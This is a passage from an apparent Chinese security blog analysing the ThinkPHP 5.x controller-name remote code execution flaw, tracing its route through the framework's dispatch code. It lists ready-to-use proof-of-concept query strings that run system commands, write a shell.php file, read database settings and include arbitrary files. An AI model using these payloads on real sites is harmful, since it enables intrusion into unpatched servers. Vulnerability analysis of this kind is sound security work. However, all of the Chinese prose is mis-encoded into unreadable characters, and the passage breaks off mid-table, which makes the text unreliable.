class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.30&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>composer update</p><p>ç›¸å…³å‚è€ƒèµ„æ–™ï¼š</p><p><strong>æ„Ÿè§‰è‡ªå·±åˆ†æçš„ä¸å¥½ï¼Œè¦å­¦ä¹ è¿˜æ˜¯å»çœ‹å‚è€ƒèµ„æ–™å§ã€‚</strong></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>5.1.x</strong> ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>5.0.x</strong> ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # è·å–é…ç½®ä¿¡æ¯</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # åŒ…å«ä»»æ„æ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # åŒ…å«ä»»æ„.phpæ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»¥ä»¥è¿™ä¸ªPOCè¿›è¡Œåˆ†æï¼ŒThinkPHP ç‰ˆæœ¬ä¸º<code>5.1.30</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><p>![image-20200923201833962](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923201833962.png)</p><h2 id="æ¼æ´æ¦‚è¿°-1"><a href="#æ¼æ´æ¦‚è¿°-1" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> åº•å±‚æ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> çš„äº§ç”Ÿã€‚</p></blockquote><h2 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>ä¸åŒç‰ˆæœ¬çš„Payloadï¼Œéœ€è¦åšç›¸å…³çš„è°ƒæ•´ã€‚</p><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨5.1.31çš„æ›´æ–°ä¸­ï¼ŒæŸ¥çœ‹ç›¸å…³æ›´æ–°çš„ä¿¡æ¯ï¼Œå…¶ä¸­å…³äº<code>ä¿®æ­£æ§åˆ¶å™¨åè·å–</code> çš„commit</p><p>![image-20200923221710652](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923221710652.png)</p><p>å¦å¤–ï¼Œå®˜æ–¹å¯¹äºæ­¤å¤„æ›´æ–°ï¼Œä¸“é—¨å‘äº†ä¸€æ¬¡å¾®ä¿¡å…¬å‘Šã€‚<a href="https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A">https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A</a></p><p>å†…å®¹å¦‚ä¸‹ï¼š</p><blockquote><p>æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„<code>getshell</code>æ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬<code>5.0</code>å’Œ<code>5.1</code>ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚å¦‚æœæš‚æ—¶æ— æ³•æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œè¯·å¼€å¯å¼ºåˆ¶è·¯ç”±ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150733.png" alt="image-20200923225433768"></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒThinkPHP ä¸å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œå¹¶ä¸”å¼€å¯äº†è·¯ç”±å™¨å…¼å®¹æ¨¡å¼ï¼Œ<code>s</code>ã€‚</p><p>5.1.31 ä¿®å¤åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><p>ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</p><ul><li>æ§åˆ¶å™¨å</li><li>å¼ºåˆ¶è·¯ç”±</li></ul><p>by ä¸ƒæœˆç«å¸ˆå‚…ï¼š</p><blockquote><p>åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œè¯´æ˜æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è·¯ç”±å…¼å®¹æ¨¡å¼ <strong>s</strong> å‚æ•°ï¼Œè€Œæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œè¯´æ˜å¯èƒ½å¯ä»¥è°ƒç”¨ä»»æ„çš„æ§åˆ¶å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¯•ç€åˆ©ç”¨ <code>http://site/?s=æ¨¡å—/æ§åˆ¶å™¨/æ–¹æ³•</code> æ¥æµ‹è¯•ä¸€ä¸‹ã€‚åœ¨å…ˆå‰çš„ <strong>ThinkPHP SQLæ³¨å…¥</strong> åˆ†ææ–‡ç« ä¸­ï¼Œæˆ‘ä»¬éƒ½æœ‰æåˆ°æ‰€æœ‰ç”¨æˆ·å‚æ•°éƒ½ä¼šç»è¿‡ <strong>Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•å¤„ç†ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨ <strong>filterValue</strong> æ–¹æ³•ï¼Œè€Œ <strong>filterValue</strong> æ–¹æ³•ä¸­ä½¿ç”¨äº† <strong>call_user_func</strong> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¥å°è¯•åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p></blockquote><p><a href="https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select">https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p><code>call_user_func($filter,$value);</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150312.png" alt="image-20200923230344961"></p><p>å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå‘½ä»¤æˆåŠŸæ‰§è¡Œã€‚</p><p>æ ¹æ®ä¿®å¤çš„å†…å®¹ï¼šå¯¹æ§åˆ¶å™¨åçš„è·å–ï¼Œç›´æ¥åœ¨è·å–æ§åˆ¶å™¨çš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œæ¥è¿›è¡Œè°ƒè¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150235.png" alt="image-20200923231658510"></p><p>å¾—å‡ºï¼šæ§åˆ¶å™¨åæ˜¯é€šè¿‡<code>$result[1]</code> æ¥è·å–çš„ã€‚</p><blockquote><p>è€Œ <strong>$result</strong> çš„å€¼æ¥æºäºå…¼å®¹æ¨¡å¼ä¸‹çš„ <strong>pathinfo</strong> ï¼Œå³ <strong>s</strong> å‚æ•°</p></blockquote><p>ç»§ç»­è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œç¨‹åºä¼šæ¥åˆ°Appç±»ä¸‹çš„<code>run</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150152.png" alt="image-20200924094001917"></p><p>ç»§ç»­è°ƒç”¨<code>Dispatch</code>ç±»çš„<code>run</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>exec</code> æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æµ‹è·¯ç”±afterè¡Œä¸º</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">&#x27;after&#x27;</span>])) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">&#x27;after&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="keyword">return</span> $dispatch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ•°æ®è‡ªåŠ¨éªŒè¯</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">&#x27;validate&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">&#x27;validate&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ç›‘å¬module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–æ§åˆ¶å™¨</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> (<span class="params">Request $request, $next</span>) <span class="title">use</span> (<span class="params">$instance</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// è·å–å½“å‰æ“ä½œå</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œæ“ä½œæ–¹æ³•</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// ç©ºæ“ä½œ</span></span><br><span class="line">            $call    = [$instance, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æ“ä½œä¸å­˜åœ¨</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . get_class($instance) . <span class="string">&#x27;-&gt;&#x27;</span> . $action . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;action_begin&#x27;</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨äº†åå°„æœºåˆ¶ï¼Œè°ƒç”¨ç±»çš„æ–¹æ³•ï¼Œè¿™é‡Œç±»å’Œæ–¹æ³•éƒ½å¯æ§ã€‚</p><p>è¯¥æ–¹æ³•ä¸­ï¼Œ<strong>æœªå¯¹å®ä¾‹åŒ–æ§åˆ¶å™¨å’Œæ“ä½œåè¿›è¡Œä»»ä½•è¿‡æ»¤ã€åˆæ³•æ€§æ£€æµ‹æ“ä½œï¼Œè¿™å°±æ˜¯å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œçš„ç›´æ¥åŸå› ã€‚</strong></p><hr><p>å¦‚æœç›´æ¥æ‹¿è¯¥ç‰ˆæœ¬çš„ <strong>payload</strong> å»æµ‹è¯• <strong>ThinkPHP5.0.x</strong> ç‰ˆæœ¬ï¼Œä¼šå‘ç°å¾ˆå¤š <strong>payload</strong> éƒ½ä¸èƒ½æˆåŠŸã€‚å…¶åŸå› æ˜¯ä¸¤ä¸ªå¤§ç‰ˆæœ¬å·²åŠ è½½çš„ç±»ä¸åŒï¼Œå¯¼è‡´å¯åˆ©ç”¨çš„ç±»ä¹Ÿä¸å°½ç›¸åŒã€‚å…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.1.x                  ThinkPHP 5.0.x</span><br><span class="line">stdClass                        stdClass </span><br><span class="line">Exception                       Exception </span><br><span class="line">ErrorException                  ErrorException </span><br><span class="line">Closure                         Closure </span><br><span class="line">Generator                       Generator </span><br><span class="line">DateTime                        DateTime </span><br><span class="line">DateTimeImmutable               DateTimeImmutable </span><br><span class="line">DateTimeZone                    DateTimeZone </span><br><span class="line">DateInterval                    DateInterval </span><br><span class="line">DatePeriod                      DatePeriod </span><br><span class="line">LibXMLError                     LibXMLError </span><br><span class="line">DOMException                    DOMException </span><br><span class="line">DOMStringList                   DOMStringList </span><br><span class="line">DOMNameList                     DOMNameList </span><br><span class="line">DOMImplementationList           DOMImplementationList </span><br><span class="line">DOMImplementationSource         DOMImplementationSource </span><br><span class="line">DOMImplementation               DOMImplementation </span><br><span class="line">DOMNode                         DOMNode </span><br><span class="line">DOMNameSpaceNode                DOMNameSpaceNode </span><br><span class="line">DOMDocumentFragment             DOMDocumentFragment </span><br><span class="line">DOMDocument                     DOMDocument </span><br><span class="line">DOMNodeList                     DOMNodeList </span><br><span class="line">DOMNamedNodeMap                 DOMNamedNodeMap </span><br><span class="line">DOMCharacterData                DOMCharacterData </span><br><span class="line">DOMAttr                         DOMAttr </span><br><span class="line">DOMElement                      DOMElement </span><br><span class="line">DOMText                         DOMText </span><br><span class="line">DOMComment                      DOMComment </span><br><span class="line">DOMTypeinfo                     DOMTypeinfo </span><br><span class="line">DOMUserDataHandler              DOMUserDataHandler </span><br><span class="line">DOMDomError                     DOMDomError </span><br><span class="line">DOMErrorHandler                 DOMErrorHandler </span><br><span class="line">DOMLocator                      DOMLocator </span><br><span class="line">DOMConfiguration                DOMConfiguration </span><br><span class="line">DOMCdataSection                 DOMCdataSection </span><br><span class="line">DOMDocumentType                 DOMDocumentType </span><br><span class="line">DOMNotation                     DOMNotation </span><br><span class="line">DOMEntity                       DOMEntity </span><br><span class="line">DOMEntityReference              DOMEntityReference </span><br><span class="line">DOMProcessingInstruction        DOMProcessingInstruction </span><br><span class="line">DOMStringExtend                 DOMStringExtend </span><br><span class="line">DOMXPath                        DOMXPath </span><br><span class="line">finfo                           finfo </span><br><span class="line">LogicException                  LogicException </span><br><span class="line">BadFunctionCallException        BadFunctionCallException </span><br><span class="line">BadMethodCallException          BadMethodCallException </span><br><span class="line">DomainException                 DomainException </span><br><span class="line">InvalidArgumentException        InvalidArgumentException </span><br><span class="line">LengthException                 LengthException </span><br><span class="line">OutOfRangeException             OutOfRangeException </span><br><span class="line">RuntimeException                RuntimeException </span><br><span class="line">OutOfBoundsException            OutOfBoundsException </span><br><span class="line">OverflowException               OverflowException </span><br><span class="line">RangeException                  RangeException </span><br><span class="line">UnderflowException              UnderflowException </span><br><span class="line">UnexpectedValueException        UnexpectedValueException </span><br><span class="line">RecursiveIteratorIterator       RecursiveIteratorIterator </span><br><span class="line">IteratorIterator                IteratorIterator </span><br><span class="line">FilterIterator                  FilterIterator </span><br><span class="line">RecursiveFilterIterator         RecursiveFilterIterator </span><br><span class="line">CallbackFilterIterator          CallbackFilterIterator </span><br><span class="line">RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator </span><br><span class="line">ParentIterator                  ParentIterator </span><br><span class="line">LimitIterator                   LimitIterator </span><br><span class="line">CachingIterator                 CachingIterator </span><br><span class="line">RecursiveCachingIterator        RecursiveCachingIterator </span><br><span class="line">NoRewindIterator                NoRewindIterator </span><br><span class="line">AppendIterator                  AppendIterator </span><br><span class="line">InfiniteIterator                InfiniteIterator </span><br><span class="line">RegexIterator                   